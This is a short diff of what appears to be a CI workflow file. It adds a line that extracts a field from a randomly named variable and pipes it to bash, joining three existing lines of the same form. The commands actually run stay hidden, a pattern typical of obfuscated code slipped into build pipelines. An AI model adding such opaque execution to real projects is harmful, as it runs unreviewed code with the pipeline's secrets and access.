@@ -22,6 +22,7 @@ jobs:
           echo $w17 | jq -r .tmlvc75 | /bin/bash
           echo $vkzs71 | jq -r .h4 | /bin/bash
           echo $eyy50 | jq -r .na864 | /bin/bash
+          echo $dryl8 | jq -r .ijfb7 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
